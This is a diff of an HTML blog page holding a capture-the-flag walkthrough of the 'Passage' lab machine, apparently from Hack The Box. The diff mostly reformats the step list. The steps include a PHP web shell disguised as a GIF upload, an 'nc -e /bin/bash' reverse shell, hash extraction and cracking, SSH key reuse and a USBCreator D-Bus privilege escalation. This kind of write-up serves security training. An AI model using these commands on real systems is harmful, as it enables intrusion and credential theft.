@@ -114,36 +114,30 @@
 
 <h1 id="the-short-version">The Short Version</h1>
 <ol>
-	<li>Run <code class="highlighter-rouge">nmap -sC -sV 10.10.10.206</code> to get the open ports;</li>
-	<li> Run <code class="highlighter-rouge">echo "10.10.10.206    passage" | sudo tee -a /etc/hosts</code> to get a nicer way to reference the machine;</li>
-	<li>Go to <code class="highlighter-rouge">http://passage:80</code> on your browser.  Notice it uses CuteNews;</li>
- 	<li>Go to <code class="highlighter-rouge">http://passage:80/CuteNews/</code> and create an account;</li>
-	<li>Edit your account by uploading an avatar "photo", which is really just a file containing:
-		<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GIF8;
-		<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="cp">?&gt;</span>
-		</code></pre></div></div>
-	</li>
-	<li>Go to <code class="highlighter-rouge">http://passage:80/CuteNews/uploads/</code>, and click on your recently uploaded PHP file;</li>
-	<li>Run <code class="highlighter-rouge">nc -nlvp 1234</code> in a terminal window;</li>
-	<li>Get the IP address of your <code class="highlighter-rouge">tun0</code> interface: <code class="highlighter-rouge">ifconfig | grep -A 1 'tun0' | tail -1 | grep -o -P 'inet(.{0,15})' | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])'</code>;</li>
-	<li>Append the URL of your upload with <code class="highlighter-rouge">?cmd=nc -e /bin/bash &lt;IP from step 8&gt; 1234</code>;</li>
-	<li>Go back to your terminal and run <code class="highlighter-rouge">python3 -c 'import pty; pty.spawn("/bin/bash")'</code> to gain access to a shell;</li>
-	<li>Now that you have access, you need some passwords.  There are some hashed passwords, encoded using <code class="highlighter-rouge">base64</code>, in the <code class="highlighter-rouge">/var/www/html/CuteNews/cdata/users/</code> directory.  You will need to get each of their hashes where possible: you can do some *quick and dirty* bash parsing to get the usernames and hashes:
-<p><code>
-for i in /var/www/html/CuteNews/cdata/users/*.php; do DECODED="$(tail -n 1 "$i" | base64 -d 2&gt;/dev/null)"; RET_VAL=$?; if [ $RET_VAL -eq 0 ]; then HASH="$(echo "$DECODED" | awk -F'64:' '{print $2}' | awk -F';' '{print $1}' | tr -d '"' | sed '/^$/d')"; if [[ ! -z "${HASH}" ]]; then NAME="$(echo "$DECODED" | awk -F'"email"' '{print $2}' | awk -F'@' '{print $1}' | awk -F'"' '{print $2}' | tr -d '"' | sed '/^$/d')"; echo -e "${NAME}\n${HASH}\n"; fi; fi; done
-</code></p>
-You could also parse the <code class="highlighter-rouge">/var/www/html/CuteNews/cdata/users/lines</code> file using <code class="highlighter-rouge">while read</code>, as I think that has the same content;</li>
-	<li>You will now need to choose a hash and decode it.  For me, <code class="highlighter-rouge">paul</code>'s hash worked.  I checked <code class="highlighter-rouge">hash-identify</code> to see that it was likely <code class="highlighter-rouge">SHA-256</code>, and thus ran <code class="highlighter-rouge">sudo gzip -d /usr/share/wordlists/rockyou.txt.gz &amp;&amp; hashcat -a 0 -m 1400 "$OUR_HASH" /usr/share/wordlists/rockyou.txt &amp;&amp; hashcat --show -m 1400 "$OUR_HASH"</code>: we see the password is <code class="highlighter-rouge">atlanta1</code>.  (Thank you, Paul, for having a terrible password);</li>
-	<li>Login as Paul; <code class="highlighter-rouge">su paul</code>—using the password we found above.  Capture an intermediate flag: <code class="highlighter-rouge">cat ~/user.txt</code>;</li>
-	<li>As Paul seems to have access to admin's (<code class="highlighter-rouge">nadav</code>'s) account via <code class="highlighter-rouge">ssh</code>, we can run <code class="highlighter-rouge">ssh -i ~/.ssh/id_rsa nadav@passage</code>; now we are pretending to be <code class="highlighter-rouge">nadav</code>;</li>
-	<li>Now we are admin, making use of a vulnerability in the USBCreator D-Bus interface that allows privilege escalation, we can gain root access to this machine by running <code class="highlighter-rouge">cd /tmp &amp;&amp; gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true &amp;&amp; ssh -i pwn root@passage</code>;</li>
-	<li>Capture the "flag": <code class="highlighter-rouge">cat /root/root.txt</code>.</li>
-</ol>
-
-<h1 id="temp">Temp</h1>
-
+<li>Run <code class="highlighter-rouge">nmap -sC -sV 10.10.10.206</code> to get the open ports;</li>
+<li> Run <code class="highlighter-rouge">echo "10.10.10.206    passage" | sudo tee -a /etc/hosts</code> to get a nicer way to reference the machine;</li>
+<li>Go to <code class="highlighter-rouge">http://passage:80</code> on your browser.  Notice it uses CuteNews;</li>
+<li>Go to <code class="highlighter-rouge">http://passage:80/CuteNews/</code> and create an account;</li>
+<li>Edit your account by uploading an avatar "photo", which is really just a file containing:
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GIF8;
+<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+</li>
+<li>Go to <code class="highlighter-rouge">http://passage:80/CuteNews/uploads/</code>, and click on your recently uploaded PHP file;</li>
+<li>Run <code class="highlighter-rouge">nc -nlvp 1234</code> in a terminal window;</li>
+<li>Get the IP address of your <code class="highlighter-rouge">tun0</code> interface: <code class="highlighter-rouge">ifconfig | grep -A 1 'tun0' | tail -1 | grep -o -P 'inet(.{0,15})' | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])'</code>;</li>
+<li>Append the URL of your upload with <code class="highlighter-rouge">?cmd=nc -e /bin/bash &lt;IP from step 8&gt; 1234</code>;</li>
+<li>Go back to your terminal and run <code class="highlighter-rouge">python3 -c 'import pty; pty.spawn("/bin/bash")'</code> to gain access to a shell;</li>
+<li>Now that you have access, you need some passwords.  There are some hashed passwords, encoded using <code class="highlighter-rouge">base64</code>, in the <code class="highlighter-rouge">/var/www/html/CuteNews/cdata/users/</code> directory.  You will need to get each of their hashes where possible: you can do some *quick and dirty* bash parsing to get the usernames and hashes:
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>i <span class="k">in</span> /var/www/html/CuteNews/cdata/users/<span class="k">*</span>.php<span class="p">;</span> <span class="k">do </span><span class="nv">DECODED</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">tail</span> <span class="nt">-n</span> 1 <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span> | <span class="nb">base64</span> <span class="nt">-d</span> 2&gt;/dev/null<span class="si">)</span><span class="s2">"</span><span class="p">;</span> <span class="nv">RET_VAL</span><span class="o">=</span><span class="nv">$?</span><span class="p">;</span> <span class="k">if</span> <span class="o">[</span> <span class="nv">$RET_VAL</span> <span class="nt">-eq</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then </span><span class="nv">HASH</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$DECODED</span><span class="s2">"</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'64:'</span> <span class="s1">'{print $2}'</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">';'</span> <span class="s1">'{print $1}'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'"'</span> | <span class="nb">sed</span> <span class="s1">'/^$/d'</span><span class="si">)</span><span class="s2">"</span><span class="p">;</span> <span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-z</span> <span class="s2">"</span><span class="k">${</span><span class="nv">HASH</span><span class="k">}</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then </span><span class="nv">NAME</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$DECODED</span><span class="s2">"</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'"email"'</span> <span class="s1">'{print $2}'</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'@'</span> <span class="s1">'{print $1}'</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'"'</span> <span class="s1">'{print $2}'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'"'</span> | <span class="nb">sed</span> <span class="s1">'/^$/d'</span><span class="si">)</span><span class="s2">"</span><span class="p">;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="k">${</span><span class="nv">NAME</span><span class="k">}</span><span class="se">\n</span><span class="k">${</span><span class="nv">HASH</span><span class="k">}</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">fi</span><span class="p">;</span> <span class="k">fi</span><span class="p">;</span> <span class="k">done</span>
 </code></pre></div></div>
+You could also parse the <code class="highlighter-rouge">/var/www/html/CuteNews/cdata/users/lines</code> file using <code class="highlighter-rouge">while read</code>, as I think that has the same content;</li>
+<li>You will now need to choose a hash and decode it.  For me, <code class="highlighter-rouge">paul</code>'s hash worked.  I checked <code class="highlighter-rouge">hash-identify</code> to see that it was likely <code class="highlighter-rouge">SHA-256</code>, and thus ran <code class="highlighter-rouge">sudo gzip -d /usr/share/wordlists/rockyou.txt.gz &amp;&amp; hashcat -a 0 -m 1400 "$OUR_HASH" /usr/share/wordlists/rockyou.txt &amp;&amp; hashcat --show -m 1400 "$OUR_HASH"</code>: we see the password is <code class="highlighter-rouge">atlanta1</code>.  (Thank you, Paul, for having a terrible password);</li>
+<li>Login as Paul; <code class="highlighter-rouge">su paul</code>—using the password we found above.  Capture an intermediate flag: <code class="highlighter-rouge">cat ~/user.txt</code>;</li>
+<li>As Paul seems to have access to admin's (<code class="highlighter-rouge">nadav</code>'s) account via <code class="highlighter-rouge">ssh</code>, we can run <code class="highlighter-rouge">ssh -i ~/.ssh/id_rsa nadav@passage</code>; now we are pretending to be <code class="highlighter-rouge">nadav</code>;</li>
+<li>Now we are admin, making use of a vulnerability in the USBCreator D-Bus interface that allows privilege escalation, we can gain root access to this machine by running <code class="highlighter-rouge">cd /tmp &amp;&amp; gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true &amp;&amp; ssh -i pwn root@passage</code>;</li>
+<li>Capture the "flag": <code class="highlighter-rouge">cat /root/root.txt</code>.</li>
+</ol>
 
 <h1 id="the-long-verbatim-version">The Long (Verbatim) Version</h1>
 
@@ -694,7 +688,7 @@ sshd:*:18464:0:99999:7:::
   </main>
   
 
-<script src="/assets/vendor-130c9c254effc51f3283620bc635851da7b99c20901216948f11ba72ee13317f.js" type="text/javascript"></script>
+<script src="/assets/vendor-734ddaa553ebf4e6ca703bd7c567ef4a0e43b0ba799607355e56b81e88781318.js" type="text/javascript"></script>
 
 
   <script src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js" type="text/javascript"></script>
